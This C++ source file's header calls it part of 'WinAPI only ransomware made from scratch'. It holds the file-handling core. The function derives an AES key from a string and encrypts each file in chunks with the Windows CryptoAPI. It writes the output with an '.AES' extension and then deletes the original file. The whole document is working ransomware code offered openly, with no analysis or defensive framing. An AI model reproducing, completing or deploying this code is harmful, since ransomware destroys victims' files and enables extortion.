/*
   ############################################
   # Copyright 2023 Panagiotis (MalwarePad)   #
   # WinAPI only ransomware made from scratch #
   ############################################
*/

#include "HandleFile.h"

std::wstring encryptedAttribute = L".AES";

#define AES_KEY_SIZE 16
#define IN_CHUNK_SIZE (AES_KEY_SIZE * 10) // a buffer must be a multiple of the key size
#define OUT_CHUNK_SIZE (IN_CHUNK_SIZE * 2) // an output buffer (for encryption) must be twice as big

std::wstring removeSubstringFromEnd(const std::wstring& originalString, const std::wstring& substringToRemove) {
	std::wstring modifiedString = originalString;

	if (modifiedString.size() >= substringToRemove.size() &&
		modifiedString.compare(modifiedString.size() - substringToRemove.size(), substringToRemove.size(), substringToRemove) == 0) {

		modifiedString = modifiedString.substr(0, modifiedString.size() - substringToRemove.size());
	}

	return modifiedString;
}

int handleFile(std::string aesKey, std::wstring input, BOOL encrypt) {
	const std::wstring output = encrypt ? input + L".AES" : removeSubstringFromEnd(input, encryptedAttribute);

	const DWORD len = aesKey.length();
	const DWORD key_size = len * sizeof(aesKey[0]); // size in bytes

	HANDLE hInpFile = CreateFileW(input.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_FLAG_SEQUENTIAL_SCAN, NULL);
	if (hInpFile == INVALID_HANDLE_VALUE) {
		// MessageBox(NULL, L"Cannot open input file!", NULL, NULL);
		return 0;
	}
	HANDLE hOutFile = CreateFileW(output.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hOutFile == INVALID_HANDLE_VALUE) {
		// MessageBox(NULL, L"Cannot open output file!", NULL, NULL);
		return 0;
	}

	DWORD dwStatus = 0;
	BOOL bResult = FALSE;
	wchar_t info[] = L"Microsoft Enhanced RSA and AES Cryptographic Provider";
	HCRYPTPROV hProv;
	if (!CryptAcquireContextW(&hProv, NULL, info, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
		MessageBox(NULL, L"CryptAcquireContext failed!", NULL, NULL);
		return 0;
	}
	HCRYPTHASH hHash;
	if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {
		MessageBox(NULL, L"CryptCreateHash failed!", NULL, NULL);
		return 0;
	}

	std::string utf8Str(aesKey.begin(), aesKey.end());
	BYTE utf8ByteArray[32];
	std::copy(utf8Str.begin(), utf8Str.end(), utf8ByteArray);

	if (!CryptHashData(hHash, (BYTE*)utf8ByteArray, key_size, 0)) {
		MessageBox(NULL, L"CryptHashData failed!", NULL, NULL);
		return 0;
	}

	HCRYPTKEY hKey;
	if (!CryptDeriveKey(hProv, CALG_AES_128, hHash, 0, &hKey)) {
		MessageBox(NULL, L"CryptDeriveKey failed!", NULL, NULL);
		return 0;
	}

	const size_t chunk_size = encrypt ? OUT_CHUNK_SIZE : IN_CHUNK_SIZE;
	BYTE* chunk = new BYTE[chunk_size];
	DWORD out_len = 0;

	BOOL isFinal = FALSE;
	DWORD readTotalSize = 0;

	DWORD inputSize = GetFileSize(hInpFile, NULL);

	while (bResult = ReadFile(hInpFile, chunk, IN_CHUNK_SIZE, &out_len, NULL)) {
		if (0 == out_len) {
			break;
		}
		readTotalSize += out_len;
		if (readTotalSize >= inputSize) {
			isFinal = TRUE;
		}

		if (encrypt) {
			if (!CryptEncrypt(hKey, NULL, isFinal, 0, chunk, &out_len, chunk_size)) {
				// MessageBox(NULL, L"CryptEncrypt failed!", NULL, NULL);
				break;
			}
		}
		else {
			if (!CryptDecrypt(hKey, NULL, isFinal, 0, chunk, &out_len)) {
				// MessageBox(NULL, L"CryptDecrypt failed!", NULL, NULL);
				break;
			}
		}
		DWORD written = 0;
		if (!WriteFile(hOutFile, chunk, out_len, &written, NULL)) {
			// MessageBox(NULL, L"writing failed!", NULL, NULL);
			break;
		}
		memset(chunk, 0, chunk_size);
	}

	delete[]chunk; chunk = NULL;

	CryptDestroyHash(hHash);
	CryptDestroyKey(hKey);
	CryptReleaseContext(hProv, 0);

	CloseHandle(hInpFile);
	CloseHandle(hOutFile);

	DeleteFile(input.c_str());
}